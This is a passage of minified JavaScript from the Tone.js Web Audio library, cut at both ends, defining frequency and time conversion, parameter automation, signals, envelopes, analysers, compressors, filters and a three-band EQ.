1/t.TimeBase.prototype._beatsToUnits.call(this,e)},t.Frequency.prototype._secondsToUnits=function(t){return 1/t},t.Frequency.prototype._defaultUnits="hz";var e={cbb:-2,cb:-1,c:0,"c#":1,cx:2,dbb:0,db:1,d:2,"d#":3,dx:4,ebb:2,eb:3,e:4,"e#":5,ex:6,fbb:3,fb:4,f:5,"f#":6,fx:7,gbb:5,gb:6,g:7,"g#":8,gx:9,abb:7,ab:8,a:9,"a#":10,ax:11,bbb:9,bb:10,b:11,"b#":12,bx:13},n=["C","C#","D","D#","E","F","F#","G","G#","A","A#","B"];return t.Frequency.A4=440,t.Frequency.mtof=function(e){return t.Frequency.A4*Math.pow(2,(e-69)/12)},t.Frequency.ftom=function(e){return 69+Math.round(12*Math.log2(e/t.Frequency.A4))},t.Frequency})),n((function(t){return t.Time=function(e,n){if(!(this instanceof t.Time))return new t.Time(e,n);t.TimeBase.call(this,e,n)},t.extend(t.Time,t.TimeBase),t.Time.prototype._expressions=Object.assign({},t.TimeBase.prototype._expressions,{quantize:{regexp:/^@(.+)/,method:function(e){if(t.Transport){var n=new this.constructor(e);return t.Transport.nextSubdivision(n)}return 0}},now:{regexp:/^\+(.+)/,method:function(t){return this._now()+new this.constructor(t)}}}),t.Time.prototype.quantize=function(e,n){n=t.defaultArg(n,1);var r=new this.constructor(e),i=this.valueOf();return i+(Math.round(i/r)*r-i)*n},t.Time.prototype.toNotation=function(){for(var e=this.toSeconds(),n=["1m"],r=1;r<8;r++){var i=Math.pow(2,r);n.push(i+"n."),n.push(i+"n"),n.push(i+"t")}n.push("0");var o=n[0],s=t.Time(n[0]).toSeconds();return n.forEach((function(n){var r=t.Time(n).toSeconds();Math.abs(r-e)<Math.abs(s-e)&&(o=n,s=r)})),o},t.Time.prototype.toBarsBeatsSixteenths=function(){var t=this._beatsToUnits(1),e=this.valueOf()/t,n=Math.floor(e/this._getTimeSignature()),r=e%1*4;return e=Math.floor(e)%this._getTimeSignature(),(r=r.toString()).length>3&&(r=parseFloat(parseFloat(r).toFixed(3))),[n,e,r].join(":")},t.Time.prototype.toTicks=function(){var t=this._beatsToUnits(1),e=this.valueOf()/t;return Math.round(e*this._getPPQ())},t.Time.prototype.toSeconds=function(){return this.valueOf()},t.Time.prototype.toMidi=function(){return t.Frequency.ftom(this.toFrequency())},t.Time})),n((function(t){return t.TransportTime=function(e,n){if(!(this instanceof t.TransportTime))return new t.TransportTime(e,n);t.Time.call(this,e,n)},t.extend(t.TransportTime,t.Time),t.TransportTime.prototype._now=function(){return t.Transport.seconds},t.TransportTime})),n((function(t){return t.Type={Default:"number",Time:"time",Frequency:"frequency",TransportTime:"transportTime",Ticks:"ticks",NormalRange:"normalRange",AudioRange:"audioRange",Decibels:"db",Interval:"interval",BPM:"bpm",Positive:"positive",Gain:"gain",Cents:"cents",Degrees:"degrees",MIDI:"midi",BarsBeatsSixteenths:"barsBeatsSixteenths",Samples:"samples",Hertz:"hertz",Note:"note",Milliseconds:"milliseconds",Seconds:"seconds",Notation:"notation"},t.prototype.toSeconds=function(e){return t.isNumber(e)?e:t.isUndef(e)?this.now():t.isString(e)?new t.Time(e).toSeconds():e instanceof t.TimeBase?e.toSeconds():void 0},t.prototype.toFrequency=function(e){return t.isNumber(e)?e:t.isString(e)||t.isUndef(e)?new t.Frequency(e).valueOf():e instanceof t.TimeBase?e.toFrequency():void 0},t.prototype.toTicks=function(e){return t.isNumber(e)||t.isString(e)?new t.TransportTime(e).toTicks():t.isUndef(e)?t.Transport.ticks:e instanceof t.TimeBase?e.toTicks():void 0},t})),n((function(t){return t.Param=function(){var e=t.defaults(arguments,["param","units","convert"],t.Param);t.AudioNode.call(this),this._param=this.input=e.param,this.units=e.units,this.convert=e.convert,this.overridden=!1,this._events=new t.Timeline(1e3),t.isDefined(e.value)&&this._param&&(this.value=e.value)},t.extend(t.Param,t.AudioNode),t.Param.defaults={units:t.Type.Default,convert:!0,param:void 0},Object.defineProperty(t.Param.prototype,"value",{get:function(){var t=this.now();return this._toUnits(this.getValueAtTime(t))},set:function(t){this._initialValue=this._fromUnits(t),this.cancelScheduledValues(this.context.currentTime),this.setValueAtTime(t,this.context.currentTime)}}),Object.defineProperty(t.Param.prototype,"minValue",{get:function(){return this.units===t.Type.Time||this.units===t.Type.Frequency||this.units===t.Type.NormalRange||this.units===t.Type.Positive||this.units===t.Type.BPM?0:this.units===t.Type.AudioRange?-1:this.units===t.Type.Decibels?-1/0:this._param.minValue}}),Object.defineProperty(t.Param.prototype,"maxValue",{get:function(){return this.units===t.Type.NormalRange||this.units===t.Type.AudioRange?1:this._param.maxValue}}),t.Param.prototype._fromUnits=function(e){if(!this.convert&&!t.isUndef(this.convert)||this.overridden)return e;switch(this.units){case t.Type.Time:return this.toSeconds(e);case t.Type.Frequency:return this.toFrequency(e);case t.Type.Decibels:return t.dbToGain(e);case t.Type.NormalRange:return Math.min(Math.max(e,0),1);case t.Type.AudioRange:return Math.min(Math.max(e,-1),1);case t.Type.Positive:return Math.max(e,0);default:return e}},t.Param.prototype._toUnits=function(e){if(!this.convert&&!t.isUndef(this.convert))return e;switch(this.units){case t.Type.Decibels:return t.gainToDb(e);default:return e}},t.Param.prototype._minOutput=1e-5,t.Param.AutomationType={Linear:"linearRampToValueAtTime",Exponential:"exponentialRampToValueAtTime",Target:"setTargetAtTime",SetValue:"setValueAtTime"},t.Param.prototype.setValueAtTime=function(e,n){return n=this.toSeconds(n),e=this._fromUnits(e),this._events.add({type:t.Param.AutomationType.SetValue,value:e,time:n}),this._param.setValueAtTime(e,n),this},t.Param.prototype.getValueAtTime=function(e){e=this.toSeconds(e);var n=this._events.getAfter(e),r=this._events.get(e),i=t.defaultArg(this._initialValue,this._param.defaultValue),o=i;if(null===r)o=i;else if(r.type===t.Param.AutomationType.Target){var s,a=this._events.getBefore(r.time);s=null===a?i:a.value,o=this._exponentialApproach(r.time,s,r.value,r.constant,e)}else o=null===n?r.value:n.type===t.Param.AutomationType.Linear?this._linearInterpolate(r.time,r.value,n.time,n.value,e):n.type===t.Param.AutomationType.Exponential?this._exponentialInterpolate(r.time,r.value,n.time,n.value,e):r.value;return o},t.Param.prototype.setRampPoint=function(t){t=this.toSeconds(t);var e=this.getValueAtTime(t);return this.cancelAndHoldAtTime(t),0===e&&(e=this._minOutput),this.setValueAtTime(this._toUnits(e),t),this},t.Param.prototype.linearRampToValueAtTime=function(e,n){return e=this._fromUnits(e),n=this.toSeconds(n),this._events.add({type:t.Param.AutomationType.Linear,value:e,time:n}),this._param.linearRampToValueAtTime(e,n),this},t.Param.prototype.exponentialRampToValueAtTime=function(e,n){return e=this._fromUnits(e),e=Math.max(this._minOutput,e),n=this.toSeconds(n),this._events.add({type:t.Param.AutomationType.Exponential,time:n,value:e}),this._param.exponentialRampToValueAtTime(e,n),this},t.Param.prototype.exponentialRampTo=function(t,e,n){return n=this.toSeconds(n),this.setRampPoint(n),this.exponentialRampToValueAtTime(t,n+this.toSeconds(e)),this},t.Param.prototype.linearRampTo=function(t,e,n){return n=this.toSeconds(n),this.setRampPoint(n),this.linearRampToValueAtTime(t,n+this.toSeconds(e)),this},t.Param.prototype.targetRampTo=function(t,e,n){return n=this.toSeconds(n),this.setRampPoint(n),this.exponentialApproachValueAtTime(t,n,e),this},t.Param.prototype.exponentialApproachValueAtTime=function(t,e,n){var r=Math.log(this.toSeconds(n)+1)/Math.log(200);return e=this.toSeconds(e),this.setTargetAtTime(t,e,r)},t.Param.prototype.setTargetAtTime=function(e,n,r){if(e=this._fromUnits(e),r<=0)throw new Error("timeConstant must be greater than 0");return n=this.toSeconds(n),this._events.add({type:t.Param.AutomationType.Target,value:e,time:n,constant:r}),this._param.setTargetAtTime(e,n,r),this},t.Param.prototype.setValueCurveAtTime=function(e,n,r,i){i=t.defaultArg(i,1),r=this.toSeconds(r),n=this.toSeconds(n),this.setValueAtTime(e[0]*i,n);for(var o=r/(e.length-1),s=1;s<e.length;s++)this.linearRampToValueAtTime(e[s]*i,n+s*o);return this},t.Param.prototype.cancelScheduledValues=function(t){return t=this.toSeconds(t),this._events.cancel(t),this._param.cancelScheduledValues(t),this},t.Param.prototype.cancelAndHoldAtTime=function(e){var n=this.getValueAtTime(e),r=this._events.get(e),i=this._events.getAfter(e);return r&&r.time===e?i?this._events.cancel(i.time):this._events.cancel(e+1e-6):i&&(this._events.cancel(i.time),this._param.cancelAndHoldAtTime||this._param.cancelScheduledValues(e),i.type===t.Param.AutomationType.Linear?this._param.cancelAndHoldAtTime?this._events.add({type:t.Param.AutomationType.Linear,value:n,time:e}):this.linearRampToValueAtTime(n,e):i.type===t.Param.AutomationType.Exponential&&(this._param.cancelAndHoldAtTime?this._events.add({type:t.Param.AutomationType.Exponential,value:n,time:e}):this.exponentialRampToValueAtTime(n,e))),this._events.add({type:t.Param.AutomationType.SetValue,value:n,time:e}),this._param.cancelAndHoldAtTime?this._param.cancelAndHoldAtTime(e):this._param.setValueAtTime(n,e),this},t.Param.prototype.rampTo=function(e,n,r){return n=t.defaultArg(n,.1),this.units===t.Type.Frequency||this.units===t.Type.BPM||this.units===t.Type.Decibels?this.exponentialRampTo(e,n,r):this.linearRampTo(e,n,r),this},t.Param.prototype._exponentialApproach=function(t,e,n,r,i){return n+(e-n)*Math.exp(-(i-t)/r)},t.Param.prototype._linearInterpolate=function(t,e,n,r,i){return e+(i-t)/(n-t)*(r-e)},t.Param.prototype._exponentialInterpolate=function(t,e,n,r,i){return e*Math.pow(r/e,(i-t)/(n-t))},t.Param.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._param=null,this._events=null,this},t.Param})),n((function(t){return t.OfflineContext=function(e,n,r){var i=new OfflineAudioContext(e,n*r,r);t.Context.call(this,{context:i,clockSource:"offline",lookAhead:0,updateInterval:128/r}),this._duration=n,this._currentTime=0},t.extend(t.OfflineContext,t.Context),t.OfflineContext.prototype.now=function(){return this._currentTime},t.OfflineContext.prototype.render=function(){for(;this._duration-this._currentTime>=0;)this.emit("tick"),this._currentTime+=this.blockTime;return this._context.startRendering()},t.OfflineContext.prototype.close=function(){return this._context=null,Promise.resolve()},t.OfflineContext})),n((function(t){if(t.supported){var e=navigator.userAgent.toLowerCase();e.includes("safari")&&!e.includes("chrome")&&e.includes("mobile")&&(t.OfflineContext.prototype.createBufferSource=function(){var t=this._context.createBufferSource(),e=t.start;return t.start=function(n){this.setTimeout(function(){e.call(t,n)}.bind(this),0)}.bind(this),t})}})),n((function(t){return t.Gain=function(){var e=t.defaults(arguments,["gain","units"],t.Gain);t.AudioNode.call(this),this.input=this.output=this._gainNode=this.context.createGain(),this.gain=new t.Param({param:this._gainNode.gain,units:e.units,value:e.gain,convert:e.convert}),this._readOnly("gain")},t.extend(t.Gain,t.AudioNode),t.Gain.defaults={gain:1,convert:!0},t.Gain.prototype.dispose=function(){t.AudioNode.prototype.dispose.call(this),this._gainNode.disconnect(),this._gainNode=null,this._writable("gain"),this.gain.dispose(),this.gain=null},t.Gain})),n((function(t){if(t.supported&&!AudioContext.prototype.createConstantSource){var e=function(t){this.context=t;for(var e=t.createBuffer(1,128,t.sampleRate),n=e.getChannelData(0),r=0;r<n.length;r++)n[r]=1;this._bufferSource=t.createBufferSource(),this._bufferSource.channelCount=1,this._bufferSource.channelCountMode="explicit",this._bufferSource.buffer=e,this._bufferSource.loop=!0;var i=this._output=t.createGain();this.offset=i.gain,this._bufferSource.connect(i)};e.prototype.start=function(t){return this._bufferSource.start(t),this},e.prototype.stop=function(t){return this._bufferSource.stop(t),this},e.prototype.connect=function(){return this._output.connect.apply(this._output,arguments),this},e.prototype.disconnect=function(){return this._output.disconnect.apply(this._output,arguments),this},AudioContext.prototype.createConstantSource=function(){return new e(this)},t.Context.prototype.createConstantSource=function(){return new e(this)}}})),n((function(t){return t.Signal=function(){var e=t.defaults(arguments,["value","units"],t.Signal);t.Param.call(this,e),this._proxies=[],this._sourceStarted=!1,this._constantSource=this.context.createConstantSource(),this._param=this._constantSource.offset,this.value=e.value,this.output=this._constantSource,this.input=this._param=this.output.offset},t.extend(t.Signal,t.Param),t.Signal.defaults={value:0,units:t.Type.Default,convert:!0},t.Signal.prototype.connect=function(e){return this._isParam(e)&&!this._sourceStarted?(this._proxies.push(e),e.overridden=!0,this._applyAutomations(e)):(t.SignalBase.prototype.connect.apply(this,arguments),this._sourceStarted||(this._sourceStarted=!0,this._constantSource.start(0))),this},t.Signal.prototype._isParam=function(e){return t.Param&&t.Param===e.constructor||e instanceof AudioParam},t.Signal.prototype._connectProxies=function(){this._sourceStarted||(this._sourceStarted=!0,this._constantSource.start(0)),this._proxies.forEach(function(e){t.SignalBase.prototype.connect.call(this,e),e._proxies&&e._connectProxies()}.bind(this))},t.Signal.prototype._onConnect=function(t){this._isParam(t)||this._connectProxies()},t.Signal.prototype._applyAutomations=function(t){var e=this.context.currentTime;t.cancelScheduledValues(e);var n=this.getValueAtTime(e);t.setValueAtTime(n,e),this._events.forEachFrom(e,(function(e){t[e.type](e.value,e.time,e.constant)}))},t.Signal.prototype.disconnect=function(e){if(this._proxies.includes(e)){var n=this._proxies.indexOf(e);this._proxies.splice(n,1)}else e||(this._proxies=[]);return t.SignalBase.prototype.disconnect.apply(this,arguments)},t.Signal.prototype.getValueAtTime=function(e){return this._param.getValueAtTime?this._param.getValueAtTime(e):t.Param.prototype.getValueAtTime.call(this,e)},["setValueAtTime","linearRampToValueAtTime","exponentialRampToValueAtTime","setTargetAtTime"].forEach((function(e){var n=t.Signal.prototype[e];t.Signal.prototype[e]=function(){var t=arguments;n.apply(this,arguments),t[0]=this._fromUnits(t[0]),t[1]=this.toSeconds(t[1]),this._proxies.forEach((function(n){n[e].apply(n,t)}))}})),["cancelScheduledValues","cancelAndHoldAtTime"].forEach((function(e){var n=t.Signal.prototype[e];t.Signal.prototype[e]=function(){var t=arguments;n.apply(this,arguments),t[0]=this.toSeconds(t[0]),this._proxies.forEach((function(n){n[e].apply(n,t)}))}})),t.Signal.prototype.dispose=function(){return t.Param.prototype.dispose.call(this),this._constantSource.disconnect(),this._constantSource=null,this._proxies=null,this},t.Signal})),n((function(t){return t.Pow=function(e){t.SignalBase.call(this),this._exp=t.defaultArg(e,1),this._expScaler=this.input=this.output=new t.WaveShaper(this._expFunc(this._exp),8192)},t.extend(t.Pow,t.SignalBase),Object.defineProperty(t.Pow.prototype,"value",{get:function(){return this._exp},set:function(t){this._exp=t,this._expScaler.setMap(this._expFunc(this._exp))}}),t.Pow.prototype._expFunc=function(t){return function(e){return Math.pow(Math.abs(e),t)}},t.Pow.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._expScaler.dispose(),this._expScaler=null,this},t.Pow})),n((function(t){return t.Envelope=function(){var e=t.defaults(arguments,["attack","decay","sustain","release"],t.Envelope);t.AudioNode.call(this),this.attack=e.attack,this.decay=e.decay,this.sustain=e.sustain,this.release=e.release,this._attackCurve="linear",this._releaseCurve="exponential",this._sig=this.output=new t.Signal(0),this.attackCurve=e.attackCurve,this.releaseCurve=e.releaseCurve},t.extend(t.Envelope,t.AudioNode),t.Envelope.defaults={attack:.01,decay:.1,sustain:.5,release:1,attackCurve:"linear",releaseCurve:"exponential"},Object.defineProperty(t.Envelope.prototype,"value",{get:function(){return this.getValueAtTime(this.now())}}),Object.defineProperty(t.Envelope.prototype,"attackCurve",{get:function(){if(t.isString(this._attackCurve))return this._attackCurve;if(t.isArray(this._attackCurve)){for(var e in t.Envelope.Type)if(t.Envelope.Type[e].In===this._attackCurve)return e;return this._attackCurve}},set:function(e){if(t.Envelope.Type.hasOwnProperty(e)){var n=t.Envelope.Type[e];t.isObject(n)?this._attackCurve=n.In:this._attackCurve=n}else{if(!t.isArray(e))throw new Error("Tone.Envelope: invalid curve: "+e);this._attackCurve=e}}}),Object.defineProperty(t.Envelope.prototype,"releaseCurve",{get:function(){if(t.isString(this._releaseCurve))return this._releaseCurve;if(t.isArray(this._releaseCurve)){for(var e in t.Envelope.Type)if(t.Envelope.Type[e].Out===this._releaseCurve)return e;return this._releaseCurve}},set:function(e){if(t.Envelope.Type.hasOwnProperty(e)){var n=t.Envelope.Type[e];t.isObject(n)?this._releaseCurve=n.Out:this._releaseCurve=n}else{if(!t.isArray(e))throw new Error("Tone.Envelope: invalid curve: "+e);this._releaseCurve=e}}}),t.Envelope.prototype.triggerAttack=function(e,n){e=this.toSeconds(e);var r=this.toSeconds(this.attack),i=r,o=this.toSeconds(this.decay);n=t.defaultArg(n,1);var s=this.getValueAtTime(e);if(s>0&&(i=(1-s)/(1/i)),"linear"===this._attackCurve)this._sig.linearRampTo(n,i,e);else if("exponential"===this._attackCurve)this._sig.targetRampTo(n,i,e);else if(i>0){this._sig.cancelAndHoldAtTime(e);var a=this._attackCurve;if(i<r){var u=1-i/r,c=Math.floor(u*this._attackCurve.length);(a=this._attackCurve.slice(c))[0]=s}this._sig.setValueCurveAtTime(a,e,i,n)}return o&&this._sig.targetRampTo(n*this.sustain,o,i+e),this},t.Envelope.prototype.triggerRelease=function(e){e=this.toSeconds(e);var n=this.getValueAtTime(e);if(n>0){var r=this.toSeconds(this.release);if("linear"===this._releaseCurve)this._sig.linearRampTo(0,r,e);else if("exponential"===this._releaseCurve)this._sig.targetRampTo(0,r,e);else{var i=this._releaseCurve;t.isArray(i)&&(this._sig.cancelAndHoldAtTime(e),this._sig.setValueCurveAtTime(i,e,r,n))}}return this},t.Envelope.prototype.getValueAtTime=function(t){return this._sig.getValueAtTime(t)},t.Envelope.prototype.triggerAttackRelease=function(t,e,n){return e=this.toSeconds(e),this.triggerAttack(e,n),this.triggerRelease(e+this.toSeconds(t)),this},t.Envelope.prototype.cancel=function(t){return this._sig.cancelScheduledValues(t),this},t.Envelope.prototype.connect=t.SignalBase.prototype.connect,function(){var e,n,r=128,i=[];for(e=0;e<r;e++)i[e]=Math.sin(e/127*(Math.PI/2));var o=[];for(e=0;e<127;e++){n=e/127;var s=Math.sin(n*(2*Math.PI)*6.4-Math.PI/2)+1;o[e]=s/10+.83*n}o[127]=1;var a=[];for(e=0;e<r;e++)a[e]=Math.ceil(e/127*5)/5;var u=[];for(e=0;e<r;e++)n=e/127,u[e]=.5*(1-Math.cos(Math.PI*n));var c,l=[];for(e=0;e<r;e++){n=e/127;var h=4*Math.pow(n,3)+.2,p=Math.cos(h*Math.PI*2*n);l[e]=Math.abs(p*(1-n))}function d(t){for(var e=new Array(t.length),n=0;n<t.length;n++)e[n]=1-t[n];return e}t.Envelope.Type={linear:"linear",exponential:"exponential",bounce:{In:d(l),Out:l},cosine:{In:i,Out:(c=i,c.slice(0).reverse())},step:{In:a,Out:d(a)},ripple:{In:o,Out:d(o)},sine:{In:u,Out:d(u)}}}(),t.Envelope.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._sig.dispose(),this._sig=null,this._attackCurve=null,this._releaseCurve=null,this},t.Envelope})),n((function(t){return t.AmplitudeEnvelope=function(){t.Envelope.apply(this,arguments),this.input=this.output=new t.Gain,this._sig.connect(this.output.gain)},t.extend(t.AmplitudeEnvelope,t.Envelope),t.AmplitudeEnvelope.prototype.dispose=function(){return t.Envelope.prototype.dispose.call(this),this},t.AmplitudeEnvelope})),n((function(t){t.supported&&(AnalyserNode.prototype.getFloatTimeDomainData||(AnalyserNode.prototype.getFloatTimeDomainData=function(t){var e=new Uint8Array(t.length);this.getByteTimeDomainData(e);for(var n=0;n<e.length;n++)t[n]=(e[n]-128)/128}))})),n((function(t){return t.Analyser=function(){var e=t.defaults(arguments,["type","size"],t.Analyser);t.AudioNode.call(this),this._analyser=this.input=this.output=this.context.createAnalyser(),this._type=e.type,this._buffer=null,this.size=e.size,this.type=e.type},t.extend(t.Analyser,t.AudioNode),t.Analyser.defaults={size:1024,type:"fft",smoothing:.8},t.Analyser.Type={Waveform:"waveform",FFT:"fft"},t.Analyser.prototype.getValue=function(){return this._type===t.Analyser.Type.FFT?this._analyser.getFloatFrequencyData(this._buffer):this._type===t.Analyser.Type.Waveform&&this._analyser.getFloatTimeDomainData(this._buffer),this._buffer},Object.defineProperty(t.Analyser.prototype,"size",{get:function(){return this._analyser.frequencyBinCount},set:function(t){this._analyser.fftSize=2*t,this._buffer=new Float32Array(t)}}),Object.defineProperty(t.Analyser.prototype,"type",{get:function(){return this._type},set:function(e){if(e!==t.Analyser.Type.Waveform&&e!==t.Analyser.Type.FFT)throw new TypeError("Tone.Analyser: invalid type: "+e);this._type=e}}),Object.defineProperty(t.Analyser.prototype,"smoothing",{get:function(){return this._analyser.smoothingTimeConstant},set:function(t){this._analyser.smoothingTimeConstant=t}}),t.Analyser.prototype.dispose=function(){t.AudioNode.prototype.dispose.call(this),this._analyser.disconnect(),this._analyser=null,this._buffer=null},t.Analyser})),n((function(t){return t.Compressor=function(){var e=t.defaults(arguments,["threshold","ratio"],t.Compressor);t.AudioNode.call(this),this._compressor=this.input=this.output=this.context.createDynamicsCompressor(),this.threshold=new t.Param({param:this._compressor.threshold,units:t.Type.Decibels,convert:!1}),this.attack=new t.Param(this._compressor.attack,t.Type.Time),this.release=new t.Param(this._compressor.release,t.Type.Time),this.knee=new t.Param({param:this._compressor.knee,units:t.Type.Decibels,convert:!1}),this.ratio=new t.Param({param:this._compressor.ratio,convert:!1}),this._readOnly(["knee","release","attack","ratio","threshold"]),this.set(e)},t.extend(t.Compressor,t.AudioNode),t.Compressor.defaults={ratio:12,threshold:-24,release:.25,attack:.003,knee:30},t.Compressor.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["knee","release","attack","ratio","threshold"]),this._compressor.disconnect(),this._compressor=null,this.attack.dispose(),this.attack=null,this.release.dispose(),this.release=null,this.threshold.dispose(),this.threshold=null,this.ratio.dispose(),this.ratio=null,this.knee.dispose(),this.knee=null,this},t.Compressor})),n((function(t){return t.Add=function(e){t.Signal.call(this),this.createInsOuts(2,0),this._sum=this.input[0]=this.input[1]=this.output=new t.Gain,this._param=this.input[1]=new t.Signal(e),this._param.connect(this._sum)},t.extend(t.Add,t.Signal),t.Add.prototype.dispose=function(){return t.Signal.prototype.dispose.call(this),this._sum.dispose(),this._sum=null,this},t.Add})),n((function(t){return t.Multiply=function(e){t.Signal.call(this),this.createInsOuts(2,0),this._mult=this.input[0]=this.output=new t.Gain,this._param=this.input[1]=this.output.gain,this.value=t.defaultArg(e,0)},t.extend(t.Multiply,t.Signal),t.Multiply.prototype.dispose=function(){return t.Signal.prototype.dispose.call(this),this._mult.dispose(),this._mult=null,this._param=null,this},t.Multiply})),n((function(t){return t.Negate=function(){t.SignalBase.call(this),this._multiply=this.input=this.output=new t.Multiply(-1)},t.extend(t.Negate,t.SignalBase),t.Negate.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._multiply.dispose(),this._multiply=null,this},t.Negate})),n((function(t){return t.Subtract=function(e){t.Signal.call(this),this.createInsOuts(2,0),this._sum=this.input[0]=this.output=new t.Gain,this._neg=new t.Negate,this._param=this.input[1]=new t.Signal(e),this._param.chain(this._neg,this._sum)},t.extend(t.Subtract,t.Signal),t.Subtract.prototype.dispose=function(){return t.Signal.prototype.dispose.call(this),this._neg.dispose(),this._neg=null,this._sum.disconnect(),this._sum=null,this},t.Subtract})),n((function(t){return t.EqualPowerGain=function(){t.SignalBase.call(this),this._eqPower=this.input=this.output=new t.WaveShaper(function(e){return Math.abs(e)<.001?0:t.equalPowerScale(e)}.bind(this),4096)},t.extend(t.EqualPowerGain,t.SignalBase),t.EqualPowerGain.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._eqPower.dispose(),this._eqPower=null,this},t.EqualPowerGain})),n((function(t){return t.CrossFade=function(e){t.AudioNode.call(this),this.createInsOuts(2,1),this.a=this.input[0]=new t.Gain,this.b=this.input[1]=new t.Gain,this.fade=new t.Signal(t.defaultArg(e,.5),t.Type.NormalRange),this._equalPowerA=new t.EqualPowerGain,this._equalPowerB=new t.EqualPowerGain,this._one=this.context.getConstant(1),this._invert=new t.Subtract,this.a.connect(this.output),this.b.connect(this.output),this.fade.chain(this._equalPowerB,this.b.gain),this._one.connect(this._invert,0,0),this.fade.connect(this._invert,0,1),this._invert.chain(this._equalPowerA,this.a.gain),this._readOnly("fade")},t.extend(t.CrossFade,t.AudioNode),t.CrossFade.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable("fade"),this._equalPowerA.dispose(),this._equalPowerA=null,this._equalPowerB.dispose(),this._equalPowerB=null,this.fade.dispose(),this.fade=null,this._invert.dispose(),this._invert=null,this._one=null,this.a.dispose(),this.a=null,this.b.dispose(),this.b=null,this},t.CrossFade})),n((function(t){return t.Filter=function(){var e=t.defaults(arguments,["frequency","type","rolloff"],t.Filter);t.AudioNode.call(this),this.createInsOuts(1,1),this._filters=[],this.frequency=new t.Signal(e.frequency,t.Type.Frequency),this.detune=new t.Signal(0,t.Type.Cents),this.gain=new t.Signal({value:e.gain,convert:!1}),this.Q=new t.Signal(e.Q),this._type=e.type,this._rolloff=e.rolloff,this.rolloff=e.rolloff,this._readOnly(["detune","frequency","gain","Q"])},t.extend(t.Filter,t.AudioNode),t.Filter.defaults={type:"lowpass",frequency:350,rolloff:-12,Q:1,gain:0},Object.defineProperty(t.Filter.prototype,"type",{get:function(){return this._type},set:function(t){if(-1===["lowpass","highpass","bandpass","lowshelf","highshelf","notch","allpass","peaking"].indexOf(t))throw new TypeError("Tone.Filter: invalid type "+t);this._type=t;for(var e=0;e<this._filters.length;e++)this._filters[e].type=t}}),Object.defineProperty(t.Filter.prototype,"rolloff",{get:function(){return this._rolloff},set:function(e){e=parseInt(e,10);var n=[-12,-24,-48,-96].indexOf(e);if(-1===n)throw new RangeError("Tone.Filter: rolloff can only be -12, -24, -48 or -96");n+=1,this._rolloff=e,this.input.disconnect();for(var r=0;r<this._filters.length;r++)this._filters[r].disconnect(),this._filters[r]=null;this._filters=new Array(n);for(var i=0;i<n;i++){var o=this.context.createBiquadFilter();o.type=this._type,this.frequency.connect(o.frequency),this.detune.connect(o.detune),this.Q.connect(o.Q),this.gain.connect(o.gain),this._filters[i]=o}var s=[this.input].concat(this._filters).concat([this.output]);t.connectSeries.apply(t,s)}}),t.Filter.prototype.dispose=function(){t.AudioNode.prototype.dispose.call(this);for(var e=0;e<this._filters.length;e++)this._filters[e].disconnect(),this._filters[e]=null;return this._filters=null,this._writable(["detune","frequency","gain","Q"]),this.frequency.dispose(),this.Q.dispose(),this.frequency=null,this.Q=null,this.detune.dispose(),this.detune=null,this.gain.dispose(),this.gain=null,this},t.Filter})),n((function(t){return t.MultibandSplit=function(){var e=t.defaults(arguments,["lowFrequency","highFrequency"],t.MultibandSplit);t.AudioNode.call(this),this.input=new t.Gain,this.output=new Array(3),this.low=this.output[0]=new t.Filter(0,"lowpass"),this._lowMidFilter=new t.Filter(0,"highpass"),this.mid=this.output[1]=new t.Filter(0,"lowpass"),this.high=this.output[2]=new t.Filter(0,"highpass"),this.lowFrequency=new t.Signal(e.lowFrequency,t.Type.Frequency),this.highFrequency=new t.Signal(e.highFrequency,t.Type.Frequency),this.Q=new t.Signal(e.Q),this.input.fan(this.low,this.high),this.input.chain(this._lowMidFilter,this.mid),this.lowFrequency.connect(this.low.frequency),this.lowFrequency.connect(this._lowMidFilter.frequency),this.highFrequency.connect(this.mid.frequency),this.highFrequency.connect(this.high.frequency),this.Q.connect(this.low.Q),this.Q.connect(this._lowMidFilter.Q),this.Q.connect(this.mid.Q),this.Q.connect(this.high.Q),this._readOnly(["high","mid","low","highFrequency","lowFrequency"])},t.extend(t.MultibandSplit,t.AudioNode),t.MultibandSplit.defaults={lowFrequency:400,highFrequency:2500,Q:1},t.MultibandSplit.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["high","mid","low","highFrequency","lowFrequency"]),this.low.dispose(),this.low=null,this._lowMidFilter.dispose(),this._lowMidFilter=null,this.mid.dispose(),this.mid=null,this.high.dispose(),this.high=null,this.lowFrequency.dispose(),this.lowFrequency=null,this.highFrequency.dispose(),this.highFrequency=null,this.Q.dispose(),this.Q=null,this},t.MultibandSplit})),n((function(t){return t.EQ3=function(){var e=t.defaults(arguments,["low","mid","high"],t.EQ3);t.AudioNode.call(this),this.output=new t.Gain,this._multibandSplit=this.input=new t.MultibandSplit({lowFrequency:e.lowFrequency,highFrequency:e.highFrequency}),this._lowGain=new t.Gain(e.low,t.Type.Decibels),this._midGain=new t.Gain(e.mid,t.Type.Decibels),this._highGain=new t.Gain(e.high,t.Type.Decibels),this.low=this._lowGain.gain,this.mid=this._midGain.gain,this.high=this._highGain.gain,this.Q=this._multibandSplit.Q,this.lowFrequency=this._multibandSplit.lowFrequency,this.highFrequency=this._multibandSplit.highFrequency,this._multibandSplit.low.chain(this._lowGain,this.output),this._multibandSplit.mid.chain(this._midGain,this.output),this._multibandSplit.high.chain(this._highGain,this.output),this._readOnly(["low","mid","high","lowFrequency","highFrequency"])},t.extend(t.EQ3,t.AudioNode),t.EQ3.defaults={low:0,mid:0,high:0,lowFrequency:400,highFrequency:2500},t.EQ3.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["low","mid","high","lowFrequency","highFrequency"]),this._multibandSplit.dispose(),this._multibandSplit=null,this.lowFrequency=null,this.highFrequency=null,this._lowGain.dispose(),this._lowGain=null,this._midGain.dispose(),this._midGain=null,this._highGain.dispose(),this._highGain=null,this.low=null,this.mid=null,this.high=null,this.Q=null,this},t.EQ3})),n((function(t){return t.Scale=function(e,n){t.SignalBase.call(this),this._outputMin=t.defaultArg(e,0),this._outputMax=t.defaultArg(n,1),this._scale=this.input=new t.Multiply(1),this._add=this.output=new 